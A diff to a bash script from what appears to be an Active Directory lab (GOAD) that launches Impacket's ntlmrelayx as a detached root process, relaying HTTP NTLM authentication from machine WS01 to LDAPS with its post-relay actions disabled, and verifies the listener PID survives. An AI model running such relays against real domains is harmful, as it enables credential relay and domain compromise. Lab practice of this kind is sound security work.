@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
-# Track the real listener PID rather than the transient sudo/stdbuf wrapper.
+# Launch in a detached root-owned nohup context and track the real TCP/80 listener PID.
 set -euo pipefail
 
 ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
@@ -39,31 +39,36 @@ umask 077
 rm -rf -- "$WORK"
 mkdir -p "$WORK"
 
-sudo -n stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   --no-dump   --no-da   --no-acl   --no-smb-server   --no-wcf-server   --no-raw-server   >"$LOG" 2>&1 &
+# Launch through a short-lived privileged shell so nohup/redirects are applied
+# by root. stdbuf execs ntlmrelayx, so the child remains detached from this
+# wrapper after the shell exits.
+sudo -n sh -c '
+  umask 077
+  nohup stdbuf -oL -eL "$1"     -t "ldaps://$2"     --no-dump     --no-da     --no-acl     --no-smb-server     --no-wcf-server     --no-raw-server     >"$3" 2>&1 </dev/null &
+  printf "%s\n" "$!"
+' sh "$NTLMRELAYX" "$TARGET" "$LOG" >"$WORK/launch.pid"
 
-LAUNCH_PID=$!
+LAUNCH_PID="$(cat "$WORK/launch.pid")"
 
 REAL_PID=""
-for _ in {1..20}; do
+for _ in {1..30}; do
   REAL_PID="$(listener_pid_80 || true)"
+
   if [[ -n "$REAL_PID" ]]; then
     CMDLINE="$(pid_cmdline "$REAL_PID")"
+
     if grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
       break
     fi
-    REAL_PID=""
-  fi
 
-  if ! kill -0 "$LAUNCH_PID" 2>/dev/null; then
-    # The sudo/stdbuf wrapper may legitimately exit after handing off.
-    :
+    REAL_PID=""
   fi
 
   sleep 0.5
 done
 
 if [[ -z "$REAL_PID" ]]; then
-  echo 'FAIL: could not identify the ntlmrelayx process owning TCP/80' >&2
+  echo "FAIL: could not identify the ntlmrelayx process owning TCP/80 (launch pid=$LAUNCH_PID)" >&2
   cat "$LOG" >&2
   exit 1
 fi
@@ -81,6 +86,16 @@ sudo kill -0 "$REAL_PID" 2>/dev/null || {
 }
 
 printf '%s\n' "$REAL_PID" >"$PIDFILE"
+
+# Prove it survives beyond initial listener creation.
+sleep 3
+
+CHECK_PID="$(listener_pid_80 || true)"
+[[ "$CHECK_PID" == "$REAL_PID" ]] || {
+  echo "FAIL: ntlmrelayx listener did not survive detached startup" >&2
+  cat "$LOG" >&2
+  exit 1
+}
 
 echo "TARGET=ldaps://$TARGET"
 echo "LOG=$LOG"
